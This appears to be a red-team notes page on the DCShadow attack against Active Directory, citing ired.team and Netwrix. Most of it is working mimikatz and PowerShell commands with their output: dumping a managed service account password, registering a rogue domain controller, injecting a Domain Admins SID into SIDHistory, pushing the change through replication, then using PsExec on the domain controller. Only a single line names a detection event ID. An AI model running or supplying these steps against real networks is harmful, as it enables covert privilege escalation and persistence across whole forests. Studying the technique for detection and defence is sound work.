
Sources : 
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow
https://www.netwrix.com/how_dcshadow_persistence_attack_works.html

Create a rogue Domain Controller and push changes to the DC Active Directory objects.
Abuses of compromised replication permissions to mimic a domain controller and make malicious changes to Active Directory. It is often used to surreptitiously hide persistence mechanisms or to escalate privileges across domain trusts.
## DC Shadow with mimikatz

Running as SYSTEM

```powershell
privilege::debug 
token::elevate 
lsadump::dcshadow /stack /object:CN=Zoombie,DC=contoso,DC=com... 
... 
lsadump::dcshadow
```

Running as domain admin

```powershell
lsadump::dcshadow /push
```


## Step of DC Shadow

### Compromise an account with administrative permissions

Example with the password for a poorly secured group managed service account (GMSA) : 

```powershell
PS> Install-Module DSInternals -Force
PS> $GMSAPwd = (Get-ADServiceAccount GMSA1 -Prop msDS-ManagedPassword).'msDS-ManagedPassword'
PS> ConvertFrom-ManagedPasswordBlob $GMSAPwd | Select-Object -ExpandProperty CurrentPassword
帙뽐怦渌㉼璿盯粩랜曞꘭�呓ꉷᏤ�뉇ꘉ욚�㡝측퉷ㅓ栤쪇�픸滈್䊟杂瀳谈ꋋ랕軡첤研麛쪡뚗ጵ謗篷협锭褶࡮뻭寞ꁕꈳ¹䲔ᯊ鵋宫鰄먚㹆⻔㚅买嬷滺눲㫚圐ન盢ḟ뼁ጘ䱏ケ蔤䮍⿆߾겋舤쇻ω킌쏑ퟠ쎫�갥挼矤缀醩ℸꆀ뭈Ȩ窢盒२葰霝빶덻妓㼪喟㗾ꖣ뙑ข
```

#### Modify objects using the DC Shadow attack

The attack includes two parts:   

- Part 1.  The adversary elevates to `SYSTEM` and makes changes to the replicated object.
- Part 2.  The attacker uses the compromised account to push the changes back to a real domain controller.

Example 1 : 

To create a new instance of mimikatz running in the local system security context
```powershell
.\mimikatz.exe
process::runp
lsadump::dcshadow /object:katrina.mendoza.adm /attribute:lastLogonTimestamp /value:123567890123456789
```

It starts a fake server and is waiting for a legit DC to replicate: 
![[Pasted image 20231101215034.png]]

Now to force a legitimate DC to replicate with our fake server, run the following in the red prompt: `lsadump::dcshadow /push`

Once the replication took place, the fake server will stop by itself: ![[Pasted image 20231101215119.png]]

Example 2 : 
Use [mimikatz](https://github.com/gentilkiwi/mimikatz) to inject a [SIDHistory](https://blog.stealthbits.com/privilege-escalation-with-dcshadow/) value for a privileged group in the same or another trusting domain. The SID used in this example represents the `Domain Admins` group in the parent (or forest root) domain.

```powershell
PS> .\mimikatz.exe
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
 
mimikatz # !ProcessToken
Token from process 0 to process 0
 * from 0 will take SYSTEM token
 * to 0 will take all 'cmd' and 'mimikatz' process
Token from 4/System
 * to 2232/powershell.exe
 * to 1252/cmd.exe
 * to 4496/mimikatz.exe
 
mimikatz # lsadump::dcshadow /object:"CN=BobT,OU=Employees,DC=sub,DC=domain,DC=com" /attribute:SidHistory /value:S-1-5-21-441320023-234525631-506766575-512
** Domain Info **
 
Domain:         DC=sub,DC=domain,DC=com
Configuration:  CN=Configuration,DC=domain,DC=com
Schema:         CN=Schema,CN=Configuration,DC=domain,DC=com
dsServiceName:  ,CN=Servers,CN=Site2,CN=Sites,CN=Configuration,DC=domain,DC=com
domainControllerFunctionality: 7 ( WIN2016 )
highestCommittedUSN: 468849
 
** Server Info **
 
Server: dc1.sub.domain.com
  InstanceId  : {be2d1604-3232-42f6-9c5b-8a37fbcdd357}
  InvocationId: {b38c988f-c904-4c18-afb3-943f12c12399}
Fake Server (not already registered): wks2.sub.domain.com
 
** Attributes checking **
 
#0: SidHistory
 
** Objects **
 
#0: CN=BobT,OU=Employees,DC=sub,DC=domain,DC=com
  SidHistory (1.2.840.113556.1.4.609-90261 rev 0):
    S-1-5-21-441320023-234525631-506766575-512
    (01050000000000051500000057024e1abf93fa0defa4341e00020000)
 
 
** Starting server **
 
 > BindString[0]: ncacn_ip_tcp:wks2[59644]
 > RPC bind registered
 > RPC Server is waiting!
== Press Control+C to stop ==
  cMaxObjects : 1000
  cMaxBytes   : 0x00a00000
  ulExtendedOp: 0
  pNC->Guid: {5bf57149-701e-47c1-bb39-35577f4ea087}
  pNC->Sid : S-1-5-21-3501040295-3816137123-30697657
  pNC->Name: DC=sub,DC=domain,DC=com
SessionKey: 1ade4b2cd9238108e9cc7c275202b9705c4bca951cbdf0e09b6a061a0e678740
1 object(s) pushed
 > RPC bind unregistered
 > stopping RPC server
 > RPC server stopped
```


```powershell
PS> .\mimikatz.exe
mimikatz # lsadump::dcshadow /push
** Domain Info **
 
Domain:         DC=sub,DC=domain,DC=com
Configuration:  CN=Configuration,DC=domain,DC=com
Schema:         CN=Schema,CN=Configuration,DC=domain,DC=com
dsServiceName:  ,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=domain,DC=com
domainControllerFunctionality: 7 ( WIN2016 )
highestCommittedUSN: 1037880
 
** Server Info **
 
Server: dc1.sub.domain.com
  InstanceId  : {ebe88399-c570-4143-bb89-9dc6546b8e09}
  InvocationId: {bef4eddf-eb26-4324-ba9d-abbae40669c5}
Fake Server (not already registered): wks2.sub.domain.com
 
** Performing Registration **
 
** Performing Push **
 
Syncing DC=sub,DC=domain,DC=com
Sync Done
 
** Performing Unregistration **
```


### Then, perform more objective

Adversary authenticates with the compromised account that is now a member of Domain Admins, thereby gaining administrative access to the forest root domain and the ability to compromise any domain in the forest.

```powershell
PS> .\PsExec.exe \\dc1.domain.com powershell.exe
 
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com
 
 
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
 
Try the new cross-platform PowerShell https://aka.ms/pscore6
 
PS> hostname
dc1
```




Event ID : `4662`